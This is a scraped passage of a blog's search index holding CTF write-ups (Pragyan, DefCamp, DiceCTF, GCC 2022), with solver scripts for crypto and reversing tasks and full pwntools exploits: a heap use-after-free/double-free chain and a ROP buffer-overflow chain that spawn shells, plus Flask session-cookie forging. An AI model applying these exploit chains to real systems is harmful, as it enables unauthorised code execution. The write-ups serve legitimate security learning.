470242416519048039892002751007637404549414518731218298102241824341344268742743948423404434709057414369822440704279068689361239474954277506897937 ....: 87251736335878699753312245001791230360774169153125961, 95526787053419014109054725109743370408304260719719585954706005684413321609913217550727024 ....: 245842583031598086600304887433115914852617240935445485427407699442096748854890978725921696692177567320558635896629488221767729803968358687622408 ....: 630160337012535746823742288778463891730458119068421721485754533986448559521, 1392298901743569283830885491292450369489388067227114648628412229866 ....: 087851506138834981673061940930326777192231195720059963067126884964384173164941643023918419515241929067350793936588931936577031156295691633910531 ....: 29315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201, 22757826149764684743463933021927715182500340 ....: 484111227818579368360240839107126711849522664234633613754664100700942438561118214061073557590806391491871814598185848108761608510852179612557240 ....: 139333852547118051755659499478661739234908902510957853009340542872322052976036210119239981021264970596897721054414227247] sage: for a in n_arr: ....: for b in n_arr: ....: if a != b and gcd(a,b) \u003e 1: ....: print(a, b, gcd(a, b)) ....: break ....: 101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961 139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201 11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379 139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201 101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961 11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379 sage: import base64 sage: c = base64.b64decode('Z9jO5jqN9+fKNYJ14xA3QV96x4AlIIjOwoGSSq2D0G6ddMnKipNJkS2n0IS3blQAMym5dnzKC5MIetKikgozmzruuKDn2Xbkdv529Na2MXizJEMTxP/ioYzUFl ....: 2rJfg7xvyrNxEyPRWoJievmjpnum2pkrWAknAb+6Hj0Qv5yIo=') sage: from Crypto.Util.number import * sage: c = bytes_to_long(c) sage: e = 65537 sage: n = 101161661751053","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:8:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Oak We were given a file Oak.class. We can decompile it and it will give us this result // // Decompiled by Procyon v0.5.36 // public class Oak { static long[] data; public static int t_helper(final int n, final int[] array) { if (array[n] != -1) { return array[n]; } if (n == 0) { return array[0] = 0; } if (n == 1) { return array[1] = 1; } if (n == 2) { return array[2] = 3; } return array[n] = 3 * t_helper(n - 1, array) - 3 * t_helper(n - 2, array) + t_helper(n - 3, array); } public static int t(final int n) { final int[] array = new int[n + 1]; for (int i = 0; i \u003c array.length; ++i) { array[i] = -1; } return t_helper(n, array); } public static void main(final String[] array) { if (array.length != 1) { System.out.println(\"Usage: [flag]\"); return; } if (check(array[0])) { System.out.println(\"Correct!\"); } else { System.out.println(\"Incorrect\"); } } public static long[] conv(final String s) { final long[] array = new long[s.length()]; for (int i = 0; i \u003c s.length(); ++i) { array[i] = (s.charAt(i) \u003c\u003c 8) + s.charAt((i + 1) % s.length()); } return array; } public static boolean check(final String s) { final long[] conv = conv(s); for (int i = 0; i \u003c conv.length; ++i) { if (Oak.data[i] != (conv[i] ^ (long)t(i * i))) { return false; } } return true; } static { Oak.data = new long[] { 28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L }; } } Basically, what it do is it will compare our converted flag value with Oak.data ^ t(i*i). t(i*i value can be easily generated (Just rewrite the t function on python), so we know the value of Oak.data ^ t(i*i). Now, let‚Äôs move to the conv function. Basically, what it do is only flag[i] \u003c\u003c 8 + flag[i+1]. And because we know the first char should be p (Because the flag is started with p_ctf), we can iteratively recover the flag. Below is the solver script import sys import string sys.setrecursionlimit(2500) arr = [] for _ in range(39): arr.append(-1) data = [ 28767, 24418, 25470, 29771, 26355, 31349, 13032, 30456, 14663, 27592, 8916, 29409, 7348, 17474, 5124, 3345, 49357, 61058, 65159, 53773, 67886, 72426, 103728, 158125, 179542, 166504, 212101, 282674, 320873, 329272, 400021, 479881, 535081, 599886, 662294, 731441, 831284, 947032, 1021482 ] def t_helper(n): global arr if arr[n] != -1: return arr[n] if n == 0: arr[0] = 0 return arr[0] if n == 1: arr[1] = 1 return arr[1] if n == 2: arr[2] = 3 return arr[2] arr[n] = 3 * t_helper(n - 1) - 3 * t_helper(n - 2) + t_helper(n - 3) return arr[n] def t(n): global arr arr = [] for _ in range(39*39+1): arr.append(-1) return t_helper(n) # Generate Oak.data[i]^t(i*i) xored_data = [] for i in range(39): res = t(i*i) xored_data.append(data[i]^res) # Iteratively recover flag by assuming the first char of the flag is \"p\" flag = 'p' prev_char = 'p' for num in xored_data[:-1]: for ch in string.printable: if ((ord(prev_char) \u003c\u003c 8) + ord(ch)) == num: flag += ch prev_char = ch break print(f'Flag: {flag}') Flag: p_ctf{0r1g1n4|_n@M3-0f_J4vA_Wa5()/|\u003c} Social Media Follow me on twitter ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:9:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"On this CTF, I only managed to solve two challenges, the web-intro and cache challenge. However, I‚Äôm super happy doing this CTF because I learned a lot about heap during doing this CTF. Kudos to the organizers! Here is my writeup for those two challenges. Web ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:0:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"web-intro We were given a flask website, where it only show Access Denied. Checking the cookie, we notice it contains the session. Using flask unsign, we try to bruteforce the secret, and found it. flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgY8Ag.brYMgM6ScmEf9me5I0-BKia5QTs flask-unsign --sign --cookie \"{'logged_in': True}\" --secret 'password' Flag: CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7} Pwn ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:1:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Cache Disclaimer This is my first time doing heap challenge, I spend a lot of time learning while doing it, so I‚Äôm sorry if I made some mistakes during explaining my solution. Would love to have your comments or feedback if you found some misinformation in my writeup. ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Intro We were given a libc and a binary file called vuln. Checking the given libc, we know that the glibc version is 2.27 ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:1","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Initial analysis Here is the result of the decompilation with Ghidra void main(EVP_PKEY_CTX *param_1) { long in_FS_OFFSET; int local_24; void *student_pointer; code **admin_pointer; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); student_pointer = (void *)0x0; admin_pointer = (code **)0x0; init(param_1); do { while( true ) { while( true ) { while( true ) { puts(\"MENU\"); puts(\"1: Make new admin\"); puts(\"2: Make new user\"); puts(\"3: Print admin info\"); puts(\"4: Edit Student Name\"); puts(\"5: Print Student Name\"); puts(\"6: Delete admin\"); puts(\"7: Delete user\"); printf(\"\\nChoice: \"); fflush(stdout); __isoc99_scanf(\"%d%*c\",\u0026local_24); if (local_24 != 1) break; admin_pointer = (code **)malloc(0x10); admin_pointer[1] = admin_info; *admin_pointer = getFlag; } if (local_24 != 2) break; student_pointer = malloc(0x10); printf(\"What is your name: \"); fflush(stdout); read(0,student_pointer,0x10); } if (local_24 != 3) break; (*admin_pointer[1])(); } if (local_24 == 4) { printf(\"What is your name: \"); fflush(stdout); read(0,student_pointer,0x10); } else if (local_24 == 5) { if (student_pointer == (void *)0x0) { puts(\"New student has not been created yet\"); } else { printf(\"Students name is %s\\n\",student_pointer); } } else if (local_24 == 6) { free(admin_pointer); } else if (local_24 == 7) { free(student_pointer); } else { puts(\"bad input\"); } } while( true ); } Reading the decompilation result, we notice some bug. Use After Free on admin and student pointer (Because after being freed, the pointer is not set to null). Double Free due to previous bug and the glibc version We can easily call a function by calling the menu 3 (print admin info) ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:2","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Pitfall solution To make our life easier, let‚Äôs make a wrapper in python to do that: libc = ELF('./libc.so.6') r = process('./vuln', env={}) def print_student(): r.sendlineafter(b'Choice: ', b'5') r.recvuntil(b'is ') return r.recvuntil(b'\\n').strip() def new_admin(): r.sendlineafter(b'Choice: ', b'1') def free_admin(): r.sendlineafter(b'Choice: ', b'6') def get_shell(): r.sendlineafter(b'Choice: ', b'3') r.interactive() def new_student(name): r.sendlineafter(b'Choice: ', b'2') r.sendlineafter(b': ', name) def edit_student(name): r.sendlineafter(b'Choice: ', b'4') r.sendlineafter(b': ', name) def free_student(): r.sendlineafter(b'Choice: ', b'7') Skimming the decompiled code, it seems the solution that we need is only abusing the UAF bug: Create Admin Free it (then the chunk goes to tcache because the malloc size is 0x10) Create User where the last 8 byte is the getFlag address Call Print Admin Info (Because admin_pointer and student_pointer is pointing to the same chunk, hence call Print Admin Info will call getFlag). After I did the above steps, turn out the printed flag was a fake flag. ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:3","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Further analysis Seems like we need to trigger shell to look around for the real flag. Basically, our target is to do the above steps, but instead of putting the getFlag address, we trigger the shell. Idea explanation In order to do that, first I try to find execve(\"/bin/sh\" on the given libc with one_gadget. We found some candidates. 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL To use that gadget, we need to leak libc base address. In order to do that, we can‚Äôt rely on the tcache bin. We need to find a way, so that during we call the free, the chunk got cached inside unsortedbin, because unsorted bin chunk will store pointer to libc main_arena. With UAF, we can leak the libc base address. How to do that? The main idea is we need to: Forge a chunk with size 0x90 Free it 7 times (So that tcache[0x90] will be full) Free it one more time. And then our chunk will go to unsortedbin (If we use size smaller than 0x90, it will go to fastbin) Using UAF, we can print the chunk data (which contains the libc address of the main_arena) Reuse the pitfall solution, but instead of getFlag address, we store our shell gadget address Let‚Äôs do that üòÑ Leak heap address In order to fulfill that, we need to find the heap_address first. We can use double free to retrieve the heap address: Create new student Free it (our chunk will go to tcache, and tcache_entry-\u003enext is null) Free it again (Because we free the same chunk, the single linked list of tcache_entry will create a loop. The tcache[0x20] will be like thisstudent_pointer-\u003estudent_pointer-\u003e...) # Leak heap address by double-free new_student(b'a'*0x10) for i in range(2): # Double free free_student() out = print_student() heap_address = u64(out.ljust(8, b'\\x00')) log.info(f'Leak heap address: {hex(heap_address)}') Heap after creating new student named aaaaaaaaaaaaaaaa pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 \u003c- chunk size metadata 0x21a0260: 0x6161616161616161 0x6161616161616161 \u003c- chunk data 0x21a0270: 0x0000000000000000 0x0000000000020d91 0x21a0280: 0x0000000000000000 0x0000000000000000 0x21a0290: 0x0000000000000000 0x0000000000000000 0x21a02a0: 0x0000000000000000 0x0000000000000000 0x21a02b0: 0x0000000000000000 0x0000000000000000 0x21a02c0: 0x0000000000000000 0x0000000000000000 0x21a02d0: 0x0000000000000000 0x0000000000000000 0x21a02e0: 0x0000000000000000 0x0000000000000000 0x21a02f0: 0x0000000000000000 0x0000000000000000 0x21a0300: 0x0000000000000000 0x0000000000000000 0x21a0310: 0x0000000000000000 0x0000000000000000 0x21a0320: 0x0000000000000000 0x0000000000000000 0x21a0330: 0x0000000000000000 0x0000000000000000 First free pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 0x21a0260: 0x0000000000000000 0x6161616161616161 \u003c- This chunk become tcache_entry, and the first 8 bytes point to the next tcache_entry, which is null because only 1 entry for now 0x21a0270: 0x0000000000000000 0x0000000000020d91 0x21a0280: 0x0000000000000000 0x0000000000000000 0x21a0290: 0x0000000000000000 0x0000000000000000 0x21a02a0: 0x0000000000000000 0x0000000000000000 0x21a02b0: 0x0000000000000000 0x0000000000000000 0x21a02c0: 0x0000000000000000 0x0000000000000000 0x21a02d0: 0x0000000000000000 0x0000000000000000 0x21a02e0: 0x0000000000000000 0x0000000000000000 0x21a02f0: 0x0000000000000000 0x0000000000000000 0x21a0300: 0x0000000000000000 0x0000000000000000 0x21a0310: 0x0000000000000000 0x0000000000000000 0x21a0320: 0x0000000000000000 0x0000000000000000 0x21a0330: 0x0000000000000000 0x0000000000000000 Free it again pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 0x21a0260: 0x00000000021a0260 0x6161616161616161 \u003c- Because of the double free, the tcache_entry single linked list create a loop 0x21a0270: 0x0000000000000000 0x000000000","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:4","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Full Solution from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ''' 1 malloc(admin) 2 malloc(student) 3 call admin[1] 4 edit student 5 print student 6 free admin 7 free student ''' libc = ELF('./libc.so.6') r = process('./vuln_patched', env={}) # r = remote('34.159.7.96', 32552) def print_student(): r.sendlineafter(b'Choice: ', b'5') r.recvuntil(b'is ') return r.recvuntil(b'\\n').strip() def new_admin(): r.sendlineafter(b'Choice: ', b'1') def free_admin(): r.sendlineafter(b'Choice: ', b'6') def get_shell(): r.sendlineafter(b'Choice: ', b'3') r.interactive() def new_student(name): r.sendlineafter(b'Choice: ', b'2') r.sendlineafter(b': ', name) def edit_student(name): r.sendlineafter(b'Choice: ', b'4') r.sendlineafter(b': ', name) def free_student(): r.sendlineafter(b'Choice: ', b'7') # Leak heap address by double-free new_student(b'a'*0x10) for i in range(2): # Double free free_student() out = print_student() heap_address = u64(out.ljust(8, b'\\x00')) log.info(f'Leak heap address: {hex(heap_address)}') # Set tcache[0x20] to empty edit_student(p64(0)) # Make the current tcache_entry-\u003enext to null new_student(b'a'*8) # The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty # Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes) # Make sure the next of our forged chunk is not the wilderness for i in range(6): new_student(p64(0) + p64(0x91)) # Free the last chunk # Overwrite it with our desired address (heap_address + 0x30) free_student() edit_student(p64(heap_address+0x30)) # tcache[0x20] = last_chunk-\u003eheap_address+0x30 new_student(b'a'*8) # Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30 new_student(b'a'*8) # Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student pointer point to heap_address+0x30 for i in range(7): free_student() # Free it 7 times to fulfill tcache[0x90] # Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins free_student() # Cache goes to unsorted bins, and its pointer will point to the main_arena # Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu, # because the student variable is still a pointer to the freed chunk out = print_student() main_arena = libc.symbols['main_arena'] libc_leaked = u64(out.ljust(8, b'\\x00')) # We got main_arena+0x60 libc_base = libc_leaked - main_arena - 0x60 log.info(f'Leak libc base address: {hex(libc_base)}') libc_shell = 0x10a38c # one_gadget shell_addr = libc_base + libc_shell new_admin() # Create new admin free_admin() # Free it new_student(p64(0)+p64(shell_addr)) # Create new student # Because of the tcache, now variable admin and student are pointing to the same chunk, # and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr get_shell() Social Media Follow me on twitter ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:5","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"This CTF is quite fun because I got the chance to learn more about wasm. Here is my writeup for challenges that I solved during working on it. Web ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:0:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"knock-knock We were given source code like below. const crypto = require('crypto'); class Database { constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } createNote({ data }) { const id = this.notes.length; this.notes.push(data); return { id, token: this.generateToken(id), }; } getNote({ id, token }) { if (token !== this.generateToken(id)) return { error: 'invalid token' }; if (id \u003e= this.notes.length) return { error: 'note not found' }; return { data: this.notes[id] }; } generateToken(id) { return crypto .createHmac('sha256', this.secret) .update(id.toString()) .digest('hex'); } } const db = new Database(); db.createNote({ data: process.env.FLAG }); const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(express.static('public')); app.post('/create', (req, res) =\u003e { const data = req.body.data ?? 'no data provided.'; const { id, token } = db.createNote({ data: data.toString() }); res.redirect(`/note?id=${id}\u0026token=${token}`); }); app.get('/note', (req, res) =\u003e { const { id, token } = req.query; const note = db.getNote({ id: parseInt(id ?? '-1'), token: (token ?? '').toString(), }); if (note.error) { res.send(note.error); } else { res.send(note.data); } }); app.listen(3000, () =\u003e { console.log('listening on port 3000'); }); The bug is on the secret generation, where they forgot to put (), hence the secret is always the same (because crypto.randomUUID value will be constant, consist of the function implementation). We only need to run the docker, and we will be able to get the correct token for the note id 0/ Flag: dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r} Pwn ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:1:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"interview-opportunity We were given a binary file and libc file. Using Ghidra, we can see the decompiled code. undefined8 main(undefined4 param_1,undefined8 param_2) { char local_22 [10]; undefined8 local_18; undefined4 local_c; local_18 = param_2; local_c = param_1; env_setup(); printf( \"Thank you for you interest in applying to DiceGang. We need great pwners like you to contin ue our traditions and competition against perfect blue.\\n\" ); printf(\"So tell us. Why should you join DiceGang?\\n\"); read(0,local_22,0x46); puts(\"Hello: \"); puts(local_22); return 0; } There is buffer overflow bug. We just need to leak the base address, and then ROP the binary to execve address (that we found from the help of one_gadget). Below is the full solution from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") main = 0x401240 puts_plt = 0x401030 puts_got = 0x404018 execve = 0xcbd20 # rsi null, rdi null pop_rdi = p64(0x0000000000401313) # pop rdi; ret; pop_rsi_r15 = p64(0x0000000000401311) # pop rsi; pop r15; ret; payload = b'a'*(0x1a+8) payload += pop_rdi + p64(puts_got) payload += p64(puts_plt) payload += p64(main) r = remote('mc.ax', 31081) log.info(r.readrepeat(1)) r.sendline(payload) log.info(r.recvuntil(b'\\n')) log.info(r.recvuntil(b'\\n')) puts_addr = u64(r.recvline().strip().ljust(8, b'\\x00')) base_addr = puts_addr - 0x00000000000765f0 # readelf -s libc.so.6| grep \"puts\" print(f'Puts addr: {hex(puts_addr)}') print(f'Base addr: {hex(base_addr)}') log.info(r.readrepeat(1)) payload = b'a'*(0x1a+8) payload += pop_rsi_r15 + p64(0) + p64(0) payload += p64(base_addr + execve) r.sendline(payload) r.interactive() Flag: dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3} Rev ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:2:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"flagle Flagle interface We were given a wasm file which is a similar app to wordle. We need to find what is the correct words (the total words are 6). We can compile the wasm file into binary, and open it with Ghidra. After reading the decompiled, there are 5 functions on the wasm, validate_1, validate_2, validate_3, validate_5, validate_6. Each function will be used to validate each word. Below is the source code undefined4 export::validate_1(undefined4 param1) { undefined4 uVar1; uVar1 = streq(param1,0x400); return uVar1; } 0x400: ram:00000400 64 ?? 64h d ram:00000401 69 ?? 69h i ram:00000402 63 ?? 63h c ? -\u003e ram:007b6563 ram:00000403 65 ?? 65h e ? -\u003e ram:00007b65 ram:00000404 7b ?? 7Bh { ? -\u003e ram:0000007b From the above code, we know that the first word is dice{ uint export::validate_2(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4, int param5) { uint uVar1; uVar1 = 0; if ((((char)param3 == '3') \u0026\u0026 ((char)param4 == 'l')) \u0026\u0026 ((char)param2 == '!')) { uVar1 = (uint)(param5 == L'D' \u0026\u0026 (char)param1 == 'F'); } return uVar1; } From the above code, we know that the second word is F!3lD uint export::validate_3(int param1,int param2,int param3,int param4,int param5) { uint uVar1; uVar1 = 0; if ((((param2 * param1 == 0x12c0) \u0026\u0026 (param3 + param1 == 0xb2)) \u0026\u0026 (param3 + param2 == 0x7e)) \u0026\u0026 ((param4 * param3 == 0x23a6 \u0026\u0026 (param4 - param5 == 0x3e)))) { uVar1 = (uint)(param3 * 0x12c0 - param5 * param4 == 0x59d5d); } return uVar1; } From the above code, we can easily brute-force to find the correct word. Result is d0Nu7 From the above image, we can see the implementation of validate_4. Below is the javascript method that is used to validate the fourth word. function c(b) { var e = { 'HLPDd': function(g, h) { return g === h; }, 'tIDVT': function(g, h) { return g(h); }, 'QIMdf': function(g, h) { return g - h; }, 'FIzyt': 'int', 'oRXGA': function(g, h) { return g \u003c\u003c h; }, 'AMINk': function(g, h) { return g \u0026 h; } } , f = current_guess; try { let g = e['HLPDd'](btoa(e['tIDVT'](intArrayToString, window[b](b[e['QIMdf'](f, 0x26f4 + 0x1014 + -0x3707 * 0x1)], e['FIzyt'])()['toString'](e['oRXGA'](e['AMINk'](f, -0x1a3 * -0x15 + 0x82e * -0x1 + -0x1a2d), 0x124d + -0x1aca + 0x87f))['match'](/.{2}/g)['map'](h=\u003eparseInt(h, f * f)))), 'ZGljZQ==') ? -0x1 * 0x1d45 + 0x2110 + -0x3ca : -0x9 * 0x295 + -0x15 * -0x3 + 0x36 * 0x6d; } catch { return 0x1b3c + -0xc9 * 0x2f + -0x19 * -0x63; } } The simplified version psuedocode is below our_input = b; f = current_guess; intArrayToString(window[our_input](our_input[f-1], 'int')().toString((f \u0026 4) \u003c\u003c 2)).match(/.{2}/g).map(h=\u003eparseInt(h, f*f)) === \"dice{\" Deduction from the function: f value should be 4, so that toString() radix argument and parseInt radix argument both will be 16, which is hexadecimal representation. From our deduction, we can conclude that basically, what it do is: our_input will be a string which is one of the fields of window object, where the field length is 5 char The result of the call will be converted toString(16), which is hex, split it per two, and then convert the hex to integer. The result should be dice{ To get the fourth word, what I do is try it one by one all fields in the Window object which has length 5 char. After some bruteforcing, I found that the correct field is cwrap, which will be our fourth word. uint export::validate_5(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4, int param5) { uint uVar1; uVar1 = 0; if ((((char)param1 == 'm') \u0026\u0026 ((char)param2 == '@')) \u0026\u0026 ((char)param3 == 'x')) { uVar1 = (uint)(param5 == 0x4d \u0026\u0026 (char)param4 == '!'); } return uVar1; } We can see that the fifth word is m@x!M uint export::validate_6(int param1,int param2,int param3,int param4,int param5) { uint uVar1; uVar1 = 0; if ((param2 + 0xb75) * (param1 + 0x6e3) == 0x53acdf) { uVar1 = (uint)(param5 == 0x7d \u0026\u0026 (param4 + 0x60a) * (param3 + 0xf49) == 0x62218f); } return uVar1; } With some bruteforcing, we can found that the sixth word is T$r3}. Finally, we re","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:3:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"baby-rsa We were given this file from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes def getAnnoyingPrime(nbits, e): while True: p = getPrime(nbits) if (p-1) % e**2 == 0: return p nbits = 128 e = 17 p = getAnnoyingPrime(nbits, e) q = getAnnoyingPrime(nbits, e) flag = b\"dice{???????????????????????}\" N = p * q cipher = pow(bytes_to_long(flag), e, N) print(f\"N = {N}\") print(f\"e = {e}\") print(f\"cipher = {cipher}\") ''' N = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971 ''' Reading the code, $N$ is small enough, so that we can easily factor it (with factordb). After we retrieve $p$ and $q$, we found out that $GCD(e, phi) = 17$, which mean there exists multiple solution to the RSA equation. However, $GCD(e, phi)$ is small enough, where we can easily find the $nth_root$ of the $cipher$. After retrieving the possible solutions, we just need to check which one contains dice{ on it. Below is the solution. from pwn import * from Crypto.Util.number import * n = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 c = 19441066986971115501070184268860318480501957407683654861466353590162062492971 # n is small, so it is easy to factor it p = 172036442175296373253148927105725488217 q = 337117592532677714973555912658569668821 phi = (p-1)*(q-1) # After analysis, GCD(e, phi) is 17. The solution is small enough to be factored with nth_root, # where one of the root will be our flag for m in Mod(c, n).nth_root(gcd(e, phi), all=True): flag = long_to_bytes(m) if b'dice' in flag: print(b'Flag: {flag.decode()}') exit() Flag: dice{cado-and-sage-say-hello} Social Media Follow me on twitter ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:4:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":" I‚Äôm super happy on writing this writeup becaue I managed to qualify to join the final of GCC 3.0 2022. Here is my writeup for challenges that I solved during qualification. (Edit: I got third place on the final :D). Rev ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:0:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"Regexp Challenge We just need to craft manually our regex per level Level 1 \\d{8}\\D{1} Level 2 ^[1,2,3,4,8,9]\\D{1} Level 3 \\d{8}[A]{1} Level 4 7{7,}[A] Level 5 .*A Level 6 \\d*A Level 7 \\d*\\D Level 8 \\d*[c,h,W,A] Level 9 [^-]+ Level 10 \\D{1}-{1}\\d{6}\\D Level 11 \\D{1}-{1}\\d{3,5}\\D Level 12 \\D{1}(-|\\+){1}\\d{6}\\D Level 13 \\d{2}\\D?\\d{5}\\D Level 14 \\d{2}\\D?\\d{1,3}\\D Level 15 ((\\D\\+\\d{4,6}\\D)|(\\D-\\d{4}\\D)) Flag: HL{RegExp-Tyc00n-91234} ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:1:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 1 Serial key was found in this verify function Flag: SYIOKLELUIOD ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:2:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 2 The calculated serial was printed in the terminal, so we can simply use it as the flag. Flag: LBQXULNJPXDE ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:3:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 3 Checking the disassembly code From the above image, we found the key From the above image, we found the logic to generate the serial Just translate it into python key = b'yrtxgfh;olmn' name = b'cyberpeace' serial = '' for i in range(12): serial += chr(((key[(i*2) % 12]^name[i % len(name)]) \u003c\u003c 2) % 0x19 + ord('B')) print(serial) 